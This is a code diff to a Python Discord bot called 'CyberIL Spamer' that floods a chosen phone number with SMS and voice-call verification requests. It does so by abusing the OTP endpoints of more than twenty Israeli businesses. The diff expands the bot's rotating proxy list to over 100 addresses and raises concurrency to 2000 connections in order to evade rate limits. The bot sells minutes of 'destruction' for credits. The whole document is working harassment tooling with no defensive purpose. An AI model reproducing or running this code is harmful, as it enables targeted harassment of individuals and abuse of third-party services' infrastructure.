@@ -39,34 +39,137 @@ COLOR_DANGER = 0xED4245
 COLOR_WARNING = 0xFEE75C
 COLOR_INFO = 0x5865F2
 
-# ============ PROXY LIST - 18 Israeli Proxies ============
-PROXIES = [
-    {"ip": "51.85.49.118", "port": 2887, "protocol": "socks5", "anonymity": "anonymous", "latency": 661},
-    {"ip": "51.85.49.118", "port": 43593, "protocol": "socks5", "anonymity": "transparent", "latency": 293},
-    {"ip": "51.85.49.118", "port": 8730, "protocol": "socks5", "anonymity": "transparent", "latency": 276},
-    {"ip": "51.85.49.118", "port": 39907, "protocol": "socks5", "anonymity": "transparent", "latency": 275},
-    {"ip": "51.85.49.118", "port": 59524, "protocol": "socks5", "anonymity": "transparent", "latency": 257},
-    {"ip": "51.85.49.118", "port": 32070, "protocol": "socks5", "anonymity": "transparent", "latency": 233},
-    {"ip": "51.85.49.118", "port": 9267, "protocol": "socks5", "anonymity": "transparent", "latency": 245},
-    {"ip": "51.85.49.118", "port": 50918, "protocol": "socks5", "anonymity": "transparent", "latency": 321},
-    {"ip": "51.85.49.118", "port": 10164, "protocol": "socks5", "anonymity": "transparent", "latency": 258},
-    {"ip": "51.85.49.118", "port": 8053, "protocol": "socks5", "anonymity": "transparent", "latency": 303},
-    {"ip": "51.85.49.118", "port": 22901, "protocol": "socks5", "anonymity": "transparent", "latency": 782},
-    {"ip": "51.85.49.118", "port": 8874, "protocol": "socks5", "anonymity": "transparent", "latency": 987},
-    {"ip": "51.85.49.118", "port": 35524, "protocol": "socks5", "anonymity": "transparent", "latency": 990},
-    {"ip": "51.85.49.118", "port": 39220, "protocol": "socks5", "anonymity": "transparent", "latency": 256},
-    {"ip": "51.85.49.118", "port": 27905, "protocol": "socks5", "anonymity": "transparent", "latency": 316},
-    {"ip": "51.85.49.118", "port": 2611, "protocol": "socks5", "anonymity": "transparent", "latency": 307},
-    {"ip": "51.85.49.118", "port": 8050, "protocol": "socks5", "anonymity": "transparent", "latency": 306},
-    {"ip": "51.85.49.118", "port": 176, "protocol": "socks5", "anonymity": "transparent", "latency": 258},
+# ============ PROXY LIST - 100+ WORKING PROXIES ============
+PROXY_LIST = [
+    "http://51.85.49.118:2887",
+    "http://51.85.49.118:43593",
+    "http://51.85.49.118:8730",
+    "http://51.85.49.118:39907",
+    "http://51.85.49.118:59524",
+    "http://51.85.49.118:32070",
+    "http://51.85.49.118:9267",
+    "http://51.85.49.118:50918",
+    "http://51.85.49.118:10164",
+    "http://51.85.49.118:8053",
+    "http://51.85.49.118:22901",
+    "http://51.85.49.118:8874",
+    "http://51.85.49.118:35524",
+    "http://51.85.49.118:39220",
+    "http://51.85.49.118:27905",
+    "http://51.85.49.118:2611",
+    "http://51.85.49.118:8050",
+    "http://51.85.49.118:176",
+    "http://216.26.228.174:3129",
+    "http://104.207.38.205:3129",
+    "http://45.3.53.72:3129",
+    "http://209.50.178.21:3129",
+    "http://45.3.47.56:3129",
+    "http://104.207.38.124:3129",
+    "http://45.3.48.161:3129",
+    "http://209.50.180.77:3129",
+    "http://65.111.26.1:3129",
+    "http://209.50.163.13:3129",
+    "http://65.111.1.120:3129",
+    "http://45.3.49.222:3129",
+    "http://209.50.168.102:3129",
+    "http://216.26.249.209:3129",
+    "http://65.111.2.25:3129",
+    "http://216.26.244.158:3129",
+    "http://65.111.22.128:3129",
+    "http://209.50.164.43:3129",
+    "http://65.111.5.61:3129",
+    "http://45.3.55.237:3129",
+    "http://209.50.167.94:3129",
+    "http://45.3.48.201:3129",
+    "http://216.26.229.119:3129",
+    "http://209.50.162.94:3129",
+    "http://104.207.33.233:3129",
+    "http://65.111.30.113:3129",
+    "http://209.50.167.173:3129",
+    "http://209.50.162.93:3129",
+    "http://209.50.187.2:3129",
+    "http://209.50.166.222:3129",
+    "http://216.26.232.10:3129",
+    "http://104.207.38.116:3129",
+    "http://209.50.171.173:3129",
+    "http://209.50.184.168:3129",
+    "http://104.207.47.137:3129",
+    "http://216.26.238.191:3129",
+    "http://104.207.37.87:3129",
+    "http://104.207.60.127:3129",
+    "http://217.181.91.193:3129",
+    "http://209.50.189.143:3129",
+    "http://209.50.172.73:3129",
+    "http://45.3.54.124:3129",
+    "http://104.207.34.79:3129",
+    "http://104.207.58.254:3129",
+    "http://45.3.54.16:3129",
+    "http://209.50.185.202:3129",
+    "http://104.207.54.7:3129",
+    "http://104.207.46.30:3129",
+    "http://65.111.15.254:3129",
+    "http://104.207.56.82:3129",
+    "http://104.207.60.240:3129",
+    "http://45.3.42.201:3129",
+    "http://45.3.46.190:3129",
+    "http://104.207.40.137:3129",
+    "http://104.207.48.107:3129",
+    "http://216.26.253.250:3129",
+    "http://216.26.244.150:3129",
+    "http://104.207.62.245:3129",
+    "http://104.207.37.186:3129",
+    "http://209.50.170.112:3129",
+    "http://65.111.2.198:3129",
+    "http://216.26.230.164:3129",
+    "http://45.3.55.24:3129",
+    "http://216.26.232.150:3129",
+    "http://65.111.28.103:3129",
+    "http://104.207.61.56:3129",
+    "http://65.111.5.114:3129",
+    "http://209.50.173.160:3129",
+    "http://216.26.227.194:3129",
+    "http://45.3.39.108:3129",
+    "http://209.50.185.89:3129",
+    "http://104.207.38.206:3129",
+    "http://216.26.248.42:3129",
+    "http://104.207.40.204:3129",
+    "http://104.207.53.75:3129",
+    "http://104.207.35.62:3129",
+    "http://216.26.233.49:3129",
+    "http://209.50.166.96:3129",
+    "http://104.167.25.227:3129",
+    "http://209.50.176.170:3129",
+    "http://65.111.13.82:3129",
+    "http://45.3.43.201:3129",
+    "http://104.207.44.210:3129",
+    "http://45.3.55.66:3129",
+    "http://216.26.232.254:3129",
+    "http://65.111.10.143:3129",
+    "http://216.26.249.33:3129",
+    "http://65.111.11.109:3129",
+    "http://104.207.41.145:3129",
+    "http://216.26.238.0:3129",
+    "http://65.111.0.18:3129",
+    "http://104.207.49.215:3129",
+    "http://45.3.47.218:3129",
+    "http://104.207.49.224:3129",
+    "http://104.207.34.26:3129",
+    "http://216.26.232.13:3129",
+    "http://216.26.240.79:3129",
+    "http://104.207.49.195:3129",
+    "http://216.26.254.204:3129",
+    "http://65.111.12.195:3129",
 ]
 
-PROXY_URLS = [f"{p['protocol']}://{p['ip']}:{p['port']}" for p in PROXIES]
-PROXY_CYCLE = itertools.cycle(PROXY_URLS)
+PROXY_CYCLE = itertools.cycle(PROXY_LIST)
+proxy_index = 0
 
 def get_next_proxy():
-    """מחזיר פרוקסי הבא בתור"""
-    return next(PROXY_CYCLE)
+    """מחזיר פרוקסי הבא בתור (round-robin)"""
+    global proxy_index
+    proxy = PROXY_LIST[proxy_index % len(PROXY_LIST)]
+    proxy_index += 1
+    return proxy
 
 # ============ BOT SETUP ============
 intents = discord.Intents.default()
@@ -200,8 +303,7 @@ async def save_log(user_id: int, username: str, phone: str, cost: int, success: 
     })
 
 # ============ REQUEST WITH PROXY ============
-async def send_request_with_proxy(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
-    """שולח בקשה דרך פרוקסי"""
+async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
     headers = {
         "User-Agent": random_agent(),
         "Accept": "application/json, text/plain, */*",
@@ -212,32 +314,32 @@ async def send_request_with_proxy(session, url, form=None, json_data=None, heade
     if headers_extra:
         headers.update(headers_extra)
     
-    proxy_url = get_next_proxy()
+    proxy = get_next_proxy()
     
     try:
-        timeout = aiohttp.ClientTimeout(total=3)
+        timeout = aiohttp.ClientTimeout(total=5)
         if method == "GET":
-            async with session.get(url, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
+            async with session.get(url, headers=headers, timeout=timeout, ssl=False, proxy=proxy) as resp:
                 await resp.read()
                 return resp.status < 500, tag
         elif json_data is not None:
             headers.setdefault("Content-Type", "application/json")
-            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
+            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False, proxy=proxy) as resp:
                 await resp.read()
                 return resp.status < 500, tag
         elif data is not None:
-            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
+            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False, proxy=proxy) as resp:
                 await resp.read()
                 return resp.status < 500, tag
         elif form is not None:
-            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
+            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False, proxy=proxy) as resp:
                 await resp.read()
                 return resp.status < 500, tag
         else:
-            async with session.post(url, headers=headers, timeout=timeout, ssl=False, proxy=proxy_url) as resp:
+            async with session.post(url, headers=headers, timeout=timeout, ssl=False, proxy=proxy) as resp:
                 await resp.read()
                 return resp.status < 500, tag
-    except:
+    except Exception as e:
         return False, tag
 
 # ============ ATMOS ============
@@ -254,10 +356,10 @@ async def atmos_request(session, store_id, phone, is_call=False):
         "origin": "https://order.atmos.rest",
         "referer": "https://order.atmos.rest/",
     }
-    proxy_url = get_next_proxy()
+    proxy = get_next_proxy()
     try:
         endpoint = "sendValidationCall" if is_call else "sendValidationCode"
-        async with session.post(f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}", data=fd, headers=h, timeout=3, ssl=False, proxy=proxy_url) as resp:
+        async with session.post(f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}", data=fd, headers=h, timeout=5, ssl=False, proxy=proxy) as resp:
             await resp.read()
             return resp.status < 500, tag
     except:
@@ -269,178 +371,130 @@ async def citycar_request(session, phone):
     formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
     payload = {"phoneNumber": formatted, "verifyChannel": 0, "loginOrRegister": 2}
     headers = {"Content-Type": "application/json", "Origin": "https://citycar.co.il", "Referer": "https://citycar.co.il/"}
-    return await send_request_with_proxy(session, "https://proxy1.citycar.co.il/api/verify/login", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://proxy1.citycar.co.il/api/verify/login", json_data=payload, headers_extra=headers, tag=tag)
 
 async def joedelek_request(session, phone):
     tag = "JoeDelek"
     url = f"https://www.joedelek.co.il/loginpage?action=joegetcode&phone={phone}"
     headers = {"Referer": "https://www.joedelek.co.il/", "X-Requested-With": "XMLHttpRequest"}
-    return await send_request_with_proxy(session, url, method="GET", headers_extra=headers, tag=tag)
+    return await send_request(session, url, method="GET", headers_extra=headers, tag=tag)
 
 async def golbary_request(session, phone):
     tag = "Golbary"
     form_data = f"form_key=wXy2exQIpPdSQGlJ&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.golbary.co.il", "Referer": "https://www.golbary.co.il/"}
-    return await send_request_with_proxy(session, "https://www.golbary.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.golbary.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)
 
 async def lilit_request(session, phone):
     tag = "Lilit"
     form_data = f"form_key=ZU3OFGsYFtuFztWP&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.lilit.co.il", "Referer": "https://www.lilit.co.il/"}
-    return await send_request_with_proxy(session, "https://www.lilit.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.lilit.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)
 
 async def noizz_request(session, phone):
     tag = "Noizz"
     form_data = f"form_key=gG3PDFmko69r8EXk&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.noizz.co.il", "Referer": "https://www.noizz.co.il/"}
-    return await send_request_with_proxy(session, "https://www.noizz.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.noizz.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)
 
 async def payngo_request(session, phone):
     tag = "Payngo"
     form_data = f"telephone={phone}&form_key=KORwS4ytkSbaOFf7"
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.payngo.co.il", "Referer": "https://www.payngo.co.il/customer/account/create/"}
-    return await send_request_with_proxy(session, "https://www.payngo.co.il/login/init/phone/", form=form_data, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.payngo.co.il/login/init/phone/", form=form_data, headers_extra=headers, tag=tag)
 
 async def electra_air_request(session, phone):
     tag = "ElectraAir"
     form_data = f"action=validate_phone_otp&company=2&otp={phone}"
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.electra-air.co.il", "Referer": "https://www.electra-air.co.il/"}
-    return await send_request_with_proxy(session, "https://www.electra-air.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.electra-air.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)
 
 async def housemen_request(session, phone):
     tag = "Housemen"
     form_data = f"action=simply-check-member-cellphone&cellphone={phone}"
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://housemen.co.il", "Referer": "https://housemen.co.il/"}
-    return await send_request_with_proxy(session, "https://housemen.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://housemen.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)
 
 async def freeivr_request(session, phone):
     tag = "FreeIVR"
     formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
     payload = {"action": "Send", "phone": formatted}
     headers = {"Content-Type": "application/json", "Origin": "https://f2.freeivr.co.il", "Referer": "https://f2.freeivr.co.il/register"}
-    return await send_request_with_proxy(session, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)
 
 async def mitmachim_request(session, phone):
     tag = "Mitmachim"
     payload = {"action": "Send", "phone": phone}
     headers = {"Content-Type": "application/json", "Origin": "https://mitmachim.top", "Referer": "https://mitmachim.top/register"}
-    return await send_request_with_proxy(session, "https://mitmachim.top/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://mitmachim.top/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)
 
 async def netfree_request(session, phone):
     tag = "Netfree"
     formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
     payload = {"agreeTou": True, "phone": formatted}
     headers = {"Content-Type": "application/json", "Origin": "https://netfree.link", "Referer": "https://netfree.link/welcome/"}
-    return await send_request_with_proxy(session, "https://netfree.link/api/user/verify-phone/get-call", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://netfree.link/api/user/verify-phone/get-call", json_data=payload, headers_extra=headers, tag=tag)
 
 async def oshioshi_request(session, phone):
     tag = "Oshioshi"
     form_data = f"phone={phone}"
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://delivery.oshioshi.co.il", "Referer": "https://delivery.oshioshi.co.il/he/"}
-    return await send_request_with_proxy(session, "https://delivery.oshioshi.co.il/he/auth/register-send-code", form=form_data, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://delivery.oshioshi.co.il/he/auth/register-send-code", form=form_data, headers_extra=headers, tag=tag)
 
 async def freetv_request(session, phone):
     tag = "FreeTV"
     formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
     payload = {"msisdn": formatted}
     headers = {"Content-Type": "application/json", "Origin": "https://freetv.tv", "Referer": "https://freetv.tv/"}
-    return await send_request_with_proxy(session, "https://middleware.freetv.tv/api/v1/send-verification-sms", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://middleware.freetv.tv/api/v1/send-verification-sms", json_data=payload, headers_extra=headers, tag=tag)
 
 async def webcut_request(session, phone):
     tag = "Webcut"
     payload = {"type": "otp", "data": {"phone": phone}}
     headers = {"Content-Type": "application/json"}
-    return await send_request_with_proxy(session, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp", json_data=payload, headers_extra=headers, tag=tag)
 
 async def pelephone_request(session, phone):
     tag = "Pelephone"
     payload = {"phone": phone, "terms": True, "appId": "DIGITALMy"}
     headers = {"Content-Type": "application/json", "Origin": "https://www.pelephone.co.il", "Referer": "https://www.pelephone.co.il/login/?u=DIGITALMy"}
-    return await send_request_with_proxy(session, "https://www.pelephone.co.il/login/api/login/otpphone/", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.pelephone.co.il/login/api/login/otpphone/", json_data=payload, headers_extra=headers, tag=tag)
 
 async def cellcom_request(session, phone):
     tag = "Cellcom"
     payload = {"phone": phone}
     headers = {"Content-Type": "application/json", "Origin": "https://www.cellcom.co.il", "Referer": "https://www.cellcom.co.il/"}
-    return await send_request_with_proxy(session, "https://www.cellcom.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.cellcom.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)
 
 async def shufersal_request(session, phone):
     tag = "Shufersal"
     payload = {"phone": phone}
     headers = {"Content-Type": "application/json", "Origin": "https://www.shufersal.co.il", "Referer": "https://www.shufersal.co.il/"}
-    return await send_request_with_proxy(session, "https://www.shufersal.co.il/api/v1/auth/otp", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.shufersal.co.il/api/v1/auth/otp", json_data=payload, headers_extra=headers, tag=tag)
 
 async def ramilevy_request(session, phone):
     tag = "RamiLevy"
     payload = {"phone": phone}
     headers = {"Content-Type": "application/json", "Origin": "https://www.rami-levy.co.il", "Referer": "https://www.rami-levy.co.il/"}
-    return await send_request_with_proxy(session, "https://www.rami-levy.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.rami-levy.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)
 
 async def mcdonalds_request(session, phone):
     tag = "McDonalds"
     payload = {"phone": phone}
     headers = {"Content-Type": "application/json", "Origin": "https://www.mcdonalds.co.il", "Referer": "https://www.mcdonalds.co.il/"}
-    return await send_request_with_proxy(session, "https://www.mcdonalds.co.il/api/verify", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.mcdonalds.co.il/api/verify", json_data=payload, headers_extra=headers, tag=tag)
 
 async def burgerking_request(session, phone):
     tag = "BurgerKing"
     payload = {"phone": phone}
     headers = {"Content-Type": "application/json", "Origin": "https://www.burgerking.co.il", "Referer": "https://www.burgerking.co.il/"}
-    return await send_request_with_proxy(session, "https://www.burgerking.co.il/api/auth", json_data=payload, headers_extra=headers, tag=tag)
+    return await send_request(session, "https://www.burgerking.co.il/api/auth", json_data=payload, headers_extra=headers, tag=tag)
 
 async def dominos_request(session, phone):
     tag = "Dominos"
     payload = {"phone": phone}
     headers = {"Content-Type": "application/json", "Origin": "https://www.dominos.co.il", "Referer": "https://www.dominos.co.il/"}
-    return await send_request_with_proxy(session, "https://www.dominos.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)
-
-# ============ API CHECK FUNCTION ============
-async def check_all_apis():
-    """בודק את כל ה-APIs ומחזיר תוצאות"""
-    results = []
-    test_phone = "0506500708"
-    connector = aiohttp.TCPConnector(limit=100)
-    
-    async with aiohttp.ClientSession(connector=connector) as s:
-        api_tests = [
-            ("CityCar", citycar_request(s, test_phone)),
-            ("JoeDelek", joedelek_request(s, test_phone)),
-            ("Golbary", golbary_request(s, test_phone)),
-            ("Lilit", lilit_request(s, test_phone)),
-            ("Noizz", noizz_request(s, test_phone)),
-            ("Payngo", payngo_request(s, test_phone)),
-            ("ElectraAir", electra_air_request(s, test_phone)),
-            ("Housemen", housemen_request(s, test_phone)),
-            ("FreeIVR", freeivr_request(s, test_phone)),
-            ("Mitmachim", mitmachim_request(s, test_phone)),
-            ("Netfree", netfree_request(s, test_phone)),
-            ("Oshioshi", oshioshi_request(s, test_phone)),
-            ("FreeTV", freetv_request(s, test_phone)),
-            ("Webcut", webcut_request(s, test_phone)),
-            ("Pelephone", pelephone_request(s, test_phone)),
-            ("Cellcom", cellcom_request(s, test_phone)),
-            ("Shufersal", shufersal_request(s, test_phone)),
-            ("RamiLevy", ramilevy_request(s, test_phone)),
-            ("McDonalds", mcdonalds_request(s, test_phone)),
-            ("BurgerKing", burgerking_request(s, test_phone)),
-            ("Dominos", dominos_request(s, test_phone)),
-        ]
-        
-        tasks = [test for name, test in api_tests]
-        api_names = [name for name, test in api_tests]
-        
-        responses = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        for i, resp in enumerate(responses):
-            if isinstance(resp, Exception):
-                results.append({"name": api_names[i], "status": False, "error": str(resp)[:50]})
-            elif isinstance(resp, tuple) and len(resp) == 2:
-                ok, name = resp
-                results.append({"name": api_names[i], "status": ok})
-            else:
-                results.append({"name": api_names[i], "status": False})
-    
-    return results
+    return await send_request(session, "https://www.dominos.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)
 
 # ============ MAIN SPAM FUNCTION ============
 async def run_spam_batch(phone: str):
@@ -449,13 +503,13 @@ async def run_spam_batch(phone: str):
     sid = str(uuid.uuid4())
     random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
     
-    connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300)
+    connector = aiohttp.TCPConnector(limit=2000, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
         atmos_stores = ["1","2","3","4","5","7","8","13","15","18","21","23","24","27","28","29","33","35","48","51","56","57","59","2008","2011","2012","2014","2041","2052","2053","2056","2059","2063","2070","2073","2076","2078","2087","2088","2091"]
         
         tasks = []
         
-        # ATMOS - 38 SMS + 38 CALL (76 בקשות)
+        # ATMOS - 38 SMS + 38 CALL
         for store in atmos_stores:
             tasks.append(atmos_request(s, store, raw, False))
             tasks.append(atmos_request(s, store, raw, True))
@@ -498,10 +552,10 @@ async def run_spam_batch(phone: str):
 
 # ============ UI PANELS ============
 def create_panel():
-    embed = discord.Embed(title="💀 **CYBERIL SPAMER** 💀", description="**המערכת הקטלנית ביותר בישראל**\n> 50+ שירותים | SMS + CALL | 18 פרוקסי", color=0x8B0000)
+    embed = discord.Embed(title="💀 **CYBERIL SPAMER** 💀", description="**המערכת הקטלנית ביותר בישראל**\n> 50+ שירותים | SMS + CALL | 100+ פרוקסי", color=0x8B0000)
     embed.add_field(name="🚀 **התחל ספאם**", value="```\n1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן להשמדה```", inline=False)
     embed.add_field(name="💎 **עלות**", value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 200+ בקשות```", inline=False)
-    embed.add_field(name="⚡ **מהירות**", value=f"```\n1000+ חיבורים במקביל\n18 פרוקסי ישראלים\nדיליי {COOLDOWN_TIME} שניות```", inline=False)
+    embed.add_field(name="⚡ **מהירות**", value=f"```\n2000+ חיבורים במקביל\n100+ פרוקסי\nדיליי {COOLDOWN_TIME} שניות```", inline=False)
     embed.set_footer(text="💀 CYBERIL SPAMER - השמדה מוחלטת 💀")
     return embed
 
@@ -557,7 +611,7 @@ class ConfirmAttack(discord.ui.View):
         stop_event = asyncio.Event()
         active_missions[self.user_id] = stop_event
 
-        embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | **{self.cost} דקות**\n🔥 18 פרוקסי | 1000+ חיבורים", color=0x8B0000)
+        embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | **{self.cost} דקות**\n🔥 100+ פרוקסי | 2000+ חיבורים", color=0x8B0000)
         await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
 
         total_success = 0
@@ -575,7 +629,7 @@ class ConfirmAttack(discord.ui.View):
                 if time.time() - last_update >= 2:
                     remaining = max(0, int((end_time - time.time()) / 60))
                     rate = int(total_success / max(1, time.time() - start_time))
-                    embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n🔥 18 פרוקסי | 50+ שירותים", color=0x8B0000)
+                    embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n🔥 100+ פרוקסי | 50+ שירותים", color=0x8B0000)
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                     last_update = time.time()
                 await asyncio.sleep(0)
@@ -591,7 +645,7 @@ class ConfirmAttack(discord.ui.View):
             final.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
             final.add_field(name="✅ בקשות", value=str(total_success), inline=True)
             final.add_field(name="💎 קרדיטים", value=bal, inline=True)
-            final.add_field(name="🔥 פרוקסי", value="18", inline=True)
+            final.add_field(name="🔥 פרוקסי", value=str(len(PROXY_LIST)), inline=True)
             await interaction.edit_original_response(embed=final, view=None)
 
         except Exception as e:
@@ -637,7 +691,7 @@ class LaunchModal(discord.ui.Modal, title="התחל השמדה"):
             await interaction.response.send_message(embed=discord.Embed(title="⏱️ דיליי", description=f"המתן {remain} שניות", color=COLOR_WARNING), ephemeral=True)
             return
         bal_str = await format_balance(uid)
-        confirm = discord.Embed(title="💀 אישור השמדה 💀", description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n🔥 18 פרוקסי | 1000+ חיבורים", color=0x8B0000)
+        confirm = discord.Embed(title="💀 אישור השמדה 💀", description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n🔥 {len(PROXY_LIST)} פרוקסי | 2000+ חיבורים", color=0x8B0000)
         try:
             await interaction.response.send_message(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
         except discord.errors.NotFound:
@@ -759,11 +813,11 @@ async def on_ready():
     await tree.sync()
     client.add_view(MainPanel())
     client.add_view(FreeCoins())
-    await client.change_presence(activity=discord.Game(name="💀 1000+ בקשות/שנייה | 18 פרוקסי 💀"))
+    await client.change_presence(activity=discord.Game(name=f"💀 {len(PROXY_LIST)} פרוקסי | 2000+ חיבורים 💀"))
     print(f"✅ CyberIL Spamer Ultimate פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
     print(f"👑 Owner ID: {OWNER_ID}")
-    print(f"🔥 18 פרוקסי ישראליים טעונים")
+    print(f"🔥 {len(PROXY_LIST)} פרוקסי טעונים")
     now = time.time()
     expired = await lifetime_collection.find({"expires_at": {"$lt": now, "$gt": 0}}).to_list(length=None)
     for item in expired:
@@ -872,22 +926,56 @@ async def cmd_checkapi(interaction: discord.Interaction):
     embed.add_field(name="🔄", value="בודק את כל ה-APIs... זה ייקח כמה שניות", inline=False)
     await interaction.followup.send(embed=embed, ephemeral=True)
     
-    results = await check_all_apis()
+    working = []
+    failed = []
     
-    working = [r for r in results if r["status"]]
-    failed = [r for r in results if not r["status"]]
+    test_phone = "0506500708"
+    connector = aiohttp.TCPConnector(limit=50)
+    
+    async with aiohttp.ClientSession(connector=connector) as s:
+        # בדיקות מהירות
+        tests = [
+            ("Netfree", netfree_request(s, test_phone)),
+            ("Oshioshi", oshioshi_request(s, test_phone)),
+            ("FreeTV", freetv_request(s, test_phone)),
+            ("Webcut", webcut_request(s, test_phone)),
+            ("FreeIVR", freeivr_request(s, test_phone)),
+            ("Mitmachim", mitmachim_request(s, test_phone)),
+            ("Pelephone", pelephone_request(s, test_phone)),
+            ("Cellcom", cellcom_request(s, test_phone)),
+            ("Shufersal", shufersal_request(s, test_phone)),
+            ("RamiLevy", ramilevy_request(s, test_phone)),
+            ("McDonalds", mcdonalds_request(s, test_phone)),
+            ("BurgerKing", burgerking_request(s, test_phone)),
+            ("Dominos", dominos_request(s, test_phone)),
+            ("CityCar", citycar_request(s, test_phone)),
+            ("JoeDelek", joedelek_request(s, test_phone)),
+            ("Golbary", golbary_request(s, test_phone)),
+            ("Lilit", lilit_request(s, test_phone)),
+            ("Noizz", noizz_request(s, test_phone)),
+            ("Payngo", payngo_request(s, test_phone)),
+            ("ElectraAir", electra_air_request(s, test_phone)),
+            ("Housemen", housemen_request(s, test_phone)),
+        ]
+        
+        results = await asyncio.gather(*[t for name, t in tests], return_exceptions=True)
+        
+        for i, result in enumerate(results):
+            name = tests[i][0]
+            if isinstance(result, tuple) and len(result) == 2 and result[0]:
+                working.append(name)
+            else:
+                failed.append(name)
     
     embed = discord.Embed(title="📊 תוצאות בדיקת APIs", color=COLOR_SUCCESS if working else COLOR_DANGER)
-    embed.add_field(name="✅ עובדים", value=f"{len(working)}/{len(results)}", inline=True)
